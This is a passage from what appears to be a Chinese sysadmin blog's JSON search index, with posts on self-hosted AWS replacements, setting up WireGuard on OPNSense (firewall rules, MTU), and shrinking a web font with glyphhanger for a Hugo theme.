用kuberspray手搓\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRedis: 自建redis\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePostgres和Mysql: 手搓，用pgbackrest备份。MySQL每天fullbackup\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eS3: 用seeweedfs替代，完美替换，支持各种IAM替代，静态化用Caddy来顶替\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ecloudfront：其它家CDN\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eElasticsearch: 自建，取消证书\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMongoDB： 自建\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eKafka：自建，kraft换掉zookeeper\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eflink：自建\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emilvus：自建\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"AWS的迁移替换"},{"content":"居然花了一晚上和一整天的时间来配置这个，真的是大出所料，在最浅显的地方栽了最大的跟头\n因为之前配置的时候都太痛快了，5分钟，然后放路由，就ok了，结果这次就结结实实翻车了！\n先说最大的原因：墙，无视墙的存在，必然被墙反噬，本来简单的事情也变得复杂。\n注意事项，普通配其实很简单，但是出乎意料的还有MTU等着你，因为VPS被强制改了MTU，所以这里还有一个坑，普通的不会遇到这个情况。\n记录一下过程：\n首先，OPNSense老版本的需要安装插件os-wireguard，但新版本已经内置wireguard了，完全不用安装\n左边栏看一下，有就OK，不用安装\n然后我们先去WireGuard的Instances，初始是空白的，那就按+号添加一个新的实例\n需要填写以下几项\nName：WG-LC\nInstance是0，表示这个实例会是wg0这个网卡\n按齿轮Gen出sever的 Public key和Private key\nLIsten port：51821 采用非标端口，是UDP类型的端口\nTunnel address：表明wg0网卡所在的网段，10.100.100.1是服务器的地址\n然后填完点击Save就OK了\n返回后，选中Enable WireGuard，然后Apply，就会启动服务了。\n接着去gen客户端配置：\n到 Peer generator，填入以下内容\nName：客户端名称，起个ZRR，好认 Address：会自动按序列生成，这里是10.100.100.2/32 Allowed IPs：这里非常关键，一定不能填0.0.0.0，那相当于所有路由都走这个wg隧道了，所以一定要指定自己要走的路由，首先是wg0的网段10.100.100.0/24，然后是内网的192.168.99.0/24 然后一定要把Config的配置给拷贝出来备用 最后点击 Store and generate nexe的按钮，不要点Apply那个 然后就OK了，回到 Peers 页看看，多了一个ZRR的对端，就没问题\n继续，需要配置接口和防火墙规则\n左边栏，Interfaces \u0026ndash;\u0026gt; Assignments\n会多出一个interface，wg0的，Description写大写的WG0，必须是这个，不要起其它的名字，WG0 \u0026ndash;\u0026gt; wg0相呼应对照，不要乱写\n点击Add\n会变成三个并排，如果加多个实例，就WG1、WG2这么排下去，一目了然\n接着去WG0的interfaces\n选中：\nEnable 激活这个interface Lock 阻止这个interface被误删 其它都保持缺省 然后点击Save，然后Apply changes，让配置生效，就可以了\n去Firewall，Rules, WG0，会看到有13条继承的规则，我们新加一条\n新加入的规则，Source选择WG0 net，这样10.100.100.0/24会被带入，其它保持缺省，Save即可\n那会看到多了一条规则\n然后我们来看看Rules还有一个WireGuard(Group)\n点开看，里面只有继承的规则，而且写了这里面没有规则，那么所有进入的连接都会被拒绝，直到里面添加了规则\n这玩意是干什么用的呢？\n成组配置，比如说你有WG0、WG1、WG2、WG3若干个实例，那么相同的防火墙规则可以放入这个Group规则中，就不用配多次了\n生成最终配置的时候，组配置优先，然后是实例自己的单独配置，组合起来合成最终的配置，所以虽然组缺省是block策略，最后合起来就不是block了\n我们这个不管，不配。\n然后到Rules，WAN我们需要放行防火墙\n添加一条规则：\n填入以下几项：\nProtocol：UDP Destination：WAN address 这个如果你WAN口有多个地址，那就随便哪个都能连接上 Destination port range：51821 Description：Allow wireguard in 这个可以不填，填上是为了分清楚51821是谁开的 然后Save、Apply即可。\n这样通常就ok了，我们这里有个超常情况，那就是MTU，如果以上步骤，客户端填入之前拷贝的配置能用，就完结了\n不用看以下内容。\n我们还不行，因为机房改了MTU，所以必须适配\n我们需要加一条，MTU=1420才可以\n为啥呢？MTU正常是1500。\n1420 字节的 MTU 是 WireGuard 隧道上一个非常常见的推荐值，因为它能确保原始 1500 字节的 IP 包在经过 WireGuard 的 80 字节加密和头部封装后，不会在传输层（如通过 1500 MTU 的以太网）发生分片（Fragmentation）。\n完结了，完全没有预料到墙是禁止墙内直连墙外的wg服务器的，握手阶段就直接进行了打断。所以换了三台服务器还是不行，严重怀疑OPNSense配置错乱，之前配Nginx stream就是这样，然后想清理配置，最后的最后是找了一台新加披的服务器，一测就通了！\n于是，遥远的东方，墙遥遥领先。\n","permalink":"https://rendoumi.com/posts/20251217-opnsense_wireguard/","summary":"\u003cp\u003e居然花了一晚上和一整天的时间来配置这个，真的是大出所料，在最浅显的地方栽了最大的跟头\u003c/p\u003e\n\u003cp\u003e因为之前配置的时候都太痛快了，5分钟，然后放路由，就ok了，结果这次就结结实实翻车了！\u003c/p\u003e\n\u003cp\u003e先说最大的原因：墙，无视墙的存在，必然被墙反噬，本来简单的事情也变得复杂。\u003c/p\u003e\n\u003cp\u003e注意事项，普通配其实很简单，但是出乎意料的还有MTU等着你，因为VPS被强制改了MTU，所以这里还有一个坑，普通的不会遇到这个情况。\u003c/p\u003e\n\u003cp\u003e记录一下过程：\u003c/p\u003e\n\u003cp\u003e首先，OPNSense老版本的需要安装插件os-wireguard，但新版本已经内置wireguard了，完全不用安装\u003c/p\u003e\n\u003cp\u003e左边栏看一下，有就OK，不用安装\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217140635467\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217140635467.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们先去WireGuard的Instances，初始是空白的，那就按+号添加一个新的实例\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217140952967\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217140952967.png\"\u003e\u003c/p\u003e\n\u003cp\u003e需要填写以下几项\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217141111022\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217141111022.png\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eName：WG-LC\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eInstance是0，表示这个实例会是wg0这个网卡\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e按齿轮Gen出sever的 Public key和Private key\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLIsten port：51821 采用非标端口，是UDP类型的端口\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTunnel address：表明wg0网卡所在的网段，10.100.100.1是服务器的地址\u003c/p\u003e\n\u003cp\u003e然后填完点击Save就OK了\u003c/p\u003e\n\u003cp\u003e返回后，选中Enable WireGuard，然后Apply，就会启动服务了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217141311489\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217141311489.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e接着去gen客户端配置：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217141608725\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217141608725.png\"\u003e\u003c/p\u003e\n\u003cp\u003e到 Peer generator，填入以下内容\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eName：客户端名称，起个ZRR，好认\u003c/li\u003e\n\u003cli\u003eAddress：会自动按序列生成，这里是10.100.100.2/32\u003c/li\u003e\n\u003cli\u003eAllowed IPs：这里非常关键，一定不能填0.0.0.0，那相当于所有路由都走这个wg隧道了，所以一定要指定自己要走的路由，首先是wg0的网段10.100.100.0/24，然后是内网的192.168.99.0/24\u003c/li\u003e\n\u003cli\u003e然后一定要把Config的配置给拷贝出来备用\u003c/li\u003e\n\u003cli\u003e最后点击 Store and generate nexe的按钮，不要点Apply那个\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e然后就OK了，回到 Peers 页看看，多了一个ZRR的对端，就没问题\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217142110721\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217142110721.png\"\u003e\u003c/p\u003e\n\u003cp\u003e继续，需要配置接口和防火墙规则\u003c/p\u003e\n\u003cp\u003e左边栏，Interfaces \u0026ndash;\u0026gt; Assignments\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217142807893\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217142807893.png\"\u003e\u003c/p\u003e\n\u003cp\u003e会多出一个interface，wg0的，Description写大写的WG0，必须是这个，不要起其它的名字，WG0 \u0026ndash;\u0026gt; wg0相呼应对照，不要乱写\u003c/p\u003e\n\u003cp\u003e点击Add\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217142908316\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217142908316.png\"\u003e\u003c/p\u003e\n\u003cp\u003e会变成三个并排，如果加多个实例，就WG1、WG2这么排下去，一目了然\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217143151970\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217143151970.png\"\u003e\u003c/p\u003e\n\u003cp\u003e接着去WG0的interfaces\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217143824101\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217143824101.png\"\u003e\u003c/p\u003e\n\u003cp\u003e选中：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEnable 激活这个interface\u003c/li\u003e\n\u003cli\u003eLock 阻止这个interface被误删\u003c/li\u003e\n\u003cli\u003e其它都保持缺省\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217144020653\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217144020653.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后点击Save，然后Apply changes，让配置生效，就可以了\u003c/p\u003e\n\u003cp\u003e去Firewall，Rules, WG0，会看到有13条继承的规则，我们新加一条\u003c/p\u003e","title":"OPNSense配置配置wireguard"},{"content":"不得不感叹，ai时代的强大，博主的本职是一个运维，对前端和CSS懂的不多，用的软件是Hugo，其实对这个也一窍不通，就是选了一个自己看得顺眼的theme，然后就是用来写文章，期间也尝试去做些改变，均已失败告终，主要是对hugo、theme、css不清楚，也不知道怎么改。\n现在有了AI的加持，这个一直用了好多年的blog的样子也看烦了，准备换掉。\n旧的界面：\n新的界面：\n用了gemini，花了一天时间，主要是嫌弃底部的前一页、后一页看起来永无止境，于是让ai搓了一个底部导航条。也定制了css。确实惊艳一枪\n但是过程中吧，用到了一个开源的字体：OPPOSans-Regular.ttf ，OPPO手机的字体，这个文件居然有9兆之巨\n完犊子了，加载字体都要花半天时间，这也太恐怖了，于是搜优化方案\n那就是压缩字体，把博客中出现的所有字扫描一遍，然后生成小字体文件，这样就好了\n那就要用到 glyphhanger 了\n注意：这个软件用起来及其麻烦，一定要在Windows下装，Linux下简直是垃圾成堆\n本体是一个nodejs的软件，用到了python的fonttools，还装了puppyteer进行网页的抓取，简直是杂烩大集合\n# 要压缩成woff2，所以要装python的2个包 npm install -g glyphhanger pip install fonttools pip install brotli #打开hugo的预览，http://localhost:1313/ hugo serve # 当前目录下的OPPOSans-Regular.ttf，生成压缩过的字体文件，格式是woff2 glyphhanger --subset OPPOSans-Regular.ttf --formats=woff2 --output ./ http://localhost:1313/posts/ ttf的完整字体经过压缩成woff2，从9兆变成了4.52兆，然后扫描网页后又压缩到了最终的75.5KB.\n这会生成一个OPPOSans-Regular-subset.woff2的新字体文件，75.5KB\n没完呢，我们还要在CSS里指定字体范围\n# 压缩字体文件，同时生成CSS样式 glyphhanger --css --subset fonts/OPPOSans-Regular.woff2 --formats=woff2 --output newfonts http://localhost:1313/posts/ 会生成CSS文件，我们把它放进定制的custom.css中即可\n@font-face { font-family: OPPO Sans; src: local(\u0026#34;OPPO Sans\u0026#34;), url(OPPOSans-Regular-subset.woff2) format(\u0026#34;woff2\u0026#34;); unicode-range: U+A,U+20-3E,U+40-7D,U+A9,U+B7,U+BB,U+2013,U+25BA,U+2705,U+3001,U+3002,U+4E00,U+4E09-4E0B,U+4E0D,U+4E14,U+4E1A,U+4E1C,U+4E24,U+4E2A,U+4E2D,U+4E34,U+4E3A,U+4E3B,U+4E48,U+4E49,U+4E4B,U+4E4E,U+4E50,U+4E5F,U+4E66,U+4E71,U+4E86,U+4E89,U+4E8B,U+4E8C,U+4E8E,U+4E94,U+4E9B,U+4EA6,U+4EA7,U+4EAB,U+4EBA,U+4ECA,U+4ECE,U+4ED3,U+4EE3-4EE5,U+4EEC,U+4EF6,U+4EFB,U+4EFD,U+4F01,U+4F1A,U+4F20,U+4F3C,U+4F46,U+4F53,U+4F55,U+4F59,U+4F5C,U+4F60,U+4F73,U+4F7F,U+4FBF,U+4FDD,U+4FE1,U+4FEE,U+5019,U+503C,U+5047,U+504F,U+505A,U+50CF,U+513F,U+5143,U+5148,U+5165,U+5168,U+516B,U+516C,U+5171,U+5173,U+5176,U+5177,U+517C,U+5185,U+518D,U+5197,U+5199,U+51B3,U+51B5,U+51C0,U+51C6,U+51FA,U+51FB,U+51FD,U+5206,U+5212,U+5219-521B,U+521D,U+5220,U+522B,U+5230,U+524D,U+526F,U+529E-52A1,U+52A8,U+52B2,U+5305,U+5316,U+5355,U+535A,U+5360,U+5361,U+5373,U+5386,U+53BB,U+53C2,U+53C8,U+53CA,U+53D1,U+53D6,U+53D8,U+53E3,U+53E4,U+53EA,U+53EF,U+53F0,U+53F7,U+53F8,U+5404,U+540C-540E,U+5411,U+5426,U+5427,U+542F,U+544A,U+5462,U+547D,U+548C,U+54EA,U+554A,U+5565,U+5668,U+56DB,U+56DE,U+56E0,U+56E7,U+56FD,U+56FE,U+5728,U+5730,U+573A,U+5740,U+5757,U+578B,U+57DF,U+585E,U+5883,U+589E,U+5904,U+5907,U+590D,U+5916,U+591A,U+5927,U+5929,U+592A,U+5931,U+5948,U+597D,U+5982,U+59CB,U+5B50,U+5B57,U+5B58,U+5B83,U+5B89,U+5B8C,U+5B98,U+5B9A,U+5B9E,U+5BA2,U+5BB6,U+5BB9,U+5BBD,U+5BC6,U+5BCC,U+5BF9,U+5BFC,U+5C01,U+5C06,U+5C31,U+5C3D,U+5C45,U+5DDE,U+5DF1,U+5DF2,U+5E02,U+5E03,U+5E38,U+5E72-5E74,U+5E76,U+5E78,U+5E7F,U+5E8F,U+5E93,U+5E94,U+5EFA,U+5F00,U+5F04,U+5F0F,U+5F20,U+5F31,U+5F39,U+5F52,U+5F53,U+5F55,U+5F85,U+5F88,U+5F97,U+5FAA,U+5FC3,U+5FC5,U+5FD7,U+5FEB,U+6000,U+6001,U+600E,U+601D,U+6027,U+603B,U+6062,U+606F,U+6089,U+60A8,U+60C5,U+60F3,U+6109,U+610F,U+613F,U+6210-6212,U+6216,U+6237,U+623F,U+6240,U+624B,U+624D,U+6253,U+6254,U+6258,U+6267,U+6269,U+627E,U+6280,U+628A,U+62A5,U+62C9,U+62DF,U+62E9,U+62EC,U+62FF,U+6301,U+6307,U+6309,U+636E,U+6377,U+6389,U+6392,U+63A5,U+63A8,U+641C,U+642D,U+6446,U+6447,U+64CD,U+652F,U+6539,U+653E,U+6545,U+6570,U+6574,U+6587,U+65AD,U+65B0,U+65B9,U+65E0,U+65E5,U+65E9,U+65F6,U+660E,U+6613,U+662F,U+663E,U+666F,U+66B4,U+66F4,U+6700,U+6708,U+6709,U+670D,U+671F,U+672A,U+672C,U+672F,U+673A,U+6743,U+6765,U+677E,U+677F,U+6790,U+679C,U+67D0,U+67E5,U+6807,U+6837-6839,U+683C,U+6848,U+6863,U+68AD,U+68C0,U+6A21,U+6B21,U+6B4C,U+6B62,U+6B63,U+6B65,U+6B7B,U+6BB5,U+6BCF,U+6BD4,U+6C42,U+6C89,U+6CA1,U+6CD5,U+6CE8,U+6D3B,U+6D4B,U+6D88,U+6DFB,U+6E05,U+6E90,U+6EE5,U+6F0F,U+706B,U+70B9,U+70C2,U+70E6,U+7130,U+7136,U+7167,U+719F,U+723D,U+7248,U+7279,U+72B6,U+72EC,U+73A9,U+73AF,U+73B0,U+7406,U+751F,U+7528,U+7531,U+754C,U+7591,U+7684,U+76D6,U+76EE,U+76F4,U+76F8,U+7701,U+770B,U+771F,U+77E5,U+77ED,U+7801,U+7814,U+786E,U+793A,U+79BB,U+79CD,U+79D2,U+79DF,U+79F0,U+79FB,U+7A00,U+7A0B,U+7A76,U+7A7A,U+7ACB,U+7AD9,U+7ADE-7AE0,U+7AEF,U+7B2C,U+7B49,U+7B54,U+7B7E,U+7B80,U+7B97,U+7BA1,U+7C7B,U+7CFB,U+7D22,U+7E41,U+7EA7,U+7EAF,U+7EC6,U+7ECF,U+7ED3,U+7ED9,U+7EDC,U+7EDF,U+7EED,U+7F3A,U+7F51,U+7F6E,U+7F72,U+7FA4,U+8003,U+8005,U+800C,U+800D,U+8017,U+804C,U+8054,U+80AF,U+80CC,U+80FD,U+8106,U+8111,U+811A,U+817E,U+81EA,U+81F4,U+8272,U+8282,U+8350,U+83B7,U+83DC,U+85CF,U+8651,U+865A,U+884C,U+88AB,U+88C2,U+88C5,U+88D5,U+897F,U+8981,U+8986,U+89C9,U+89D2,U+89E3,U+8A00,U+8B66,U+8BA1,U+8BA2,U+8BAF,U+8BB2,U+8BBA,U+8BBE,U+8BBF,U+8BC1,U+8BD5,U+8BDD,U+8BE2,U+8BE5,U+8BE6,U+8BED,U+8BEF,U+8BF4,U+8BF7,U+8C03,U+8C37,U+8C61,U+8D25,U+8D44,U+8D70,U+8D77,U+8DD1,U+8DDF,U+8DEF,U+8DF3,U+8DF5,U+8F7B,U+8F7D,U+8F83,U+8F93,U+8FC1,U+8FC7,U+8FD0,U+8FD4,U+8FD8,U+8FD9,U+8FDB,U+8FDE,U+9000-9002,U+9009,U+901A,U+903C,U+9047,U+904D,U+9053,U+9075,U+90A3,U+90E8,U+90FD,U+914D,U+91CA,U+91CC,U+91CD,U+91CF,U+94FE,U+9501,U+9519,U+952E,U+955C,U+957F,U+95EE,U+95F4,U+9632,U+963B,U+9645,U+964B,U+9650,U+9664,U+968F,U+9690,U+969C,U+96BE,U+96C6,U+9700,U+975E,U+9762,U+9875,U+9876,U+987B,U+9884,U+9891,U+9898,U+9996,U+9AA4,U+9AD8,U+9EBB,U+FF01,U+FF0C,U+FF1A,U+FF1F; font-style: normal; font-display: swap; font-weight: 300 700; } 把压缩后的字体和CSS再次提交后博客的速度就变得飞快了。\n似乎有点不务正业了，感慨，AI委实要让前端要灭亡了。\n","permalink":"https://rendoumi.com/posts/20251213-blog_renew/","summary":"\u003cp\u003e不得不感叹，ai时代的强大，博主的本职是一个运维，对前端和CSS懂的不多，用的软件是Hugo，其实对这个也一窍不通，就是选了一个自己看得顺眼的theme，然后就是用来写文章，期间也尝试去做些改变，均已失败告终，主要是对hugo、theme、css不清楚，也不知道怎么改。\u003c/p\u003e\n\u003cp\u003e现在有了AI的加持，这个一直用了好多年的blog的样子也看烦了，准备换掉。\u003c/p\u003e\n\u003cp\u003e旧的界面：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213181856750\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213181856750.png\"\u003e\u003c/p\u003e\n\u003cp\u003e新的界面：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213182225463\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213182225463.png\"\u003e\u003c/p\u003e\n\u003cp\u003e用了gemini，花了一天时间，主要是嫌弃底部的前一页、后一页看起来永无止境，于是让ai搓了一个底部导航条。也定制了css。确实惊艳一枪\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213185955036\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213185955036.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是过程中吧，用到了一个开源的字体：OPPOSans-Regular.ttf ，OPPO手机的字体，这个文件居然有9兆之巨\u003c/p\u003e\n\u003cp\u003e完犊子了，加载字体都要花半天时间，这也太恐怖了，于是搜优化方案\u003c/p\u003e\n\u003cp\u003e那就是压缩字体，把博客中出现的所有字扫描一遍，然后生成小字体文件，这样就好了\u003c/p\u003e\n\u003cp\u003e那就要用到 \u003ccode\u003eglyphhanger\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e注意：这个软件用起来及其麻烦，一定要在Windows下装，Linux下简直是垃圾成堆\u003c/p\u003e\n\u003cp\u003e本体是一个nodejs的软件，用到了python的fonttools，还装了puppyteer进行网页的抓取，简直是杂烩大集合\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 要压缩成woff2，所以要装python的2个包\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g glyphhanger\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install fonttools\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install brotli\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#打开hugo的预览，http://localhost:1313/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehugo serve\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 当前目录下的OPPOSans-Regular.ttf，生成压缩过的字体文件，格式是woff2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eglyphhanger --subset OPPOSans-Regular.ttf --formats\u003cspan class=\"o\"\u003e=\u003c/span\u003ewoff2 --output ./ http://localhost:1313/posts/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20251213184318813\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213184318813.png\"\u003e\u003c/p\u003e\n\u003cp\u003ettf的完整字体经过压缩成woff2，从9兆变成了4.52兆，然后扫描网页后又压缩到了最终的75.5KB.\u003c/p\u003e\n\u003cp\u003e这会生成一个\u003ccode\u003eOPPOSans-Regular-subset.woff2\u003c/code\u003e的新字体文件，75.5KB\u003c/p\u003e\n\u003cp\u003e没完呢，我们还要在CSS里指定字体范围\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 压缩字体文件，同时生成CSS样式\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eglyphhanger --css --subset fonts/OPPOSans-Regular.woff2 --formats\u003cspan class=\"o\"\u003e=\u003c/span\u003ewoff2 --output newfonts http://localhost:1313/posts/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e会生成CSS文件，我们把它放进定制的custom.css中即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213185802356\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213185802356.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@font-face \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-family: OPPO Sans\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  src: local\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;OPPO Sans\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       url\u003cspan class=\"o\"\u003e(\u003c/span\u003eOPPOSans-Regular-subset.woff2\u003cspan class=\"o\"\u003e)\u003c/span\u003e format\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;woff2\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  unicode-range: U+A,U+20-3E,U+40-7D,U+A9,U+B7,U+BB,U+2013,U+25BA,U+2705,U+3001,U+3002,U+4E00,U+4E09-4E0B,U+4E0D,U+4E14,U+4E1A,U+4E1C,U+4E24,U+4E2A,U+4E2D,U+4E34,U+4E3A,U+4E3B,U+4E48,U+4E49,U+4E4B,U+4E4E,U+4E50,U+4E5F,U+4E66,U+4E71,U+4E86,U+4E89,U+4E8B,U+4E8C,U+4E8E,U+4E94,U+4E9B,U+4EA6,U+4EA7,U+4EAB,U+4EBA,U+4ECA,U+4ECE,U+4ED3,U+4EE3-4EE5,U+4EEC,U+4EF6,U+4EFB,U+4EFD,U+4F01,U+4F1A,U+4F20,U+4F3C,U+4F46,U+4F53,U+4F55,U+4F59,U+4F5C,U+4F60,U+4F73,U+4F7F,U+4FBF,U+4FDD,U+4FE1,U+4FEE,U+5019,U+503C,U+5047,U+504F,U+505A,U+50CF,U+513F,U+5143,U+5148,U+5165,U+5168,U+516B,U+516C,U+5171,U+5173,U+5176,U+5177,U+517C,U+5185,U+518D,U+5197,U+5199,U+51B3,U+51B5,U+51C0,U+51C6,U+51FA,U+51FB,U+51FD,U+5206,U+5212,U+5219-521B,U+521D,U+5220,U+522B,U+5230,U+524D,U+526F,U+529E-52A1,U+52A8,U+52B2,U+5305,U+5316,U+5355,U+535A,U+5360,U+5361,U+5373,U+5386,U+53BB,U+53C2,U+53C8,U+53CA,U+53D1,U+53D6,U+53D8,U+53E3,U+53E4,U+53EA,U+53EF,U+53F0,U+53F7,U+53F8,U+5404,U+540C-540E,U+5411,U+5426,U+5427,U+542F,U+544A,U+5462,U+547D,U+548C,U+54EA,U+554A,U+5565,U+5668,U+56DB,U+56DE,U+56E0,U+56E7,U+56FD,U+56FE,U+5728,U+5730,U+573A,U+5740,U+5757,U+578B,U+57DF,U+585E,U+5883,U+589E,U+5904,U+5907,U+590D,U+5916,U+591A,U+5927,U+5929,U+592A,U+5931,U+5948,U+597D,U+5982,U+59CB,U+5B50,U+5B57,U+5B58,U+5B83,U+5B89,U+5B8C,U+5B98,U+5B9A,U+5B9E,U+5BA2,U+5BB6,U+5BB9,U+5BBD,U+5BC6,U+5BCC,U+5BF9,U+5BFC,U+5C01,U+5C06,U+5C31,U+5C3D,U+5C45,U+5DDE,U+5DF1,U+5DF2,U+5E02,U+5E03,U+5E38,U+5E72-5E74,U+5E76,U+5E78,U+5E7F,U+5E8F,U+5E93,U+5E94,U+5EFA,U+5F00,U+5F04,U+5F0F,U+5F20,U+5F31,U+5F39,U+5F52,U+5F53,U+5F55,U+5F85,U+5F88,U+5F97,U+5FAA,U+5FC3,U+5FC5,U+5FD7,U+5FEB,U+6000,U+6001,U+600E,U+601D,U+6027,U+603B,U+6062,U+606F,U+6089,U+60A8,U+60C5,U+60F3,U+6109,U+610F,U+613F,U+6210-6212,U+6216,U+6237,U+623F,U+6240,U+624B,U+624D,U+6253,U+6254,U+6258,U+6267,U+6269,U+627E,U+6280,U+628A,U+62A5,U+62C9,U+62DF,U+62E9,U+62EC,U+62FF,U+6301,U+6307,U+6309,U+636E,U+6377,U+6389,U+6392,U+63A5,U+63A8,U+641C,U+642D,U+6446,U+6447,U+64CD,U+652F,U+6539,U+653E,U+6545,U+6570,U+6574,U+6587,U+65AD,U+65B0,U+65B9,U+65E0,U+65E5,U+65E9,U+65F6,U+660E,U+6613,U+662F,U+663E,U+666F,U+66B4,U+66F4,U+6700,U+6708,U+6709,U+670D,U+671F,U+672A,U+672C,U+672F,U+673A,U+6743,U+6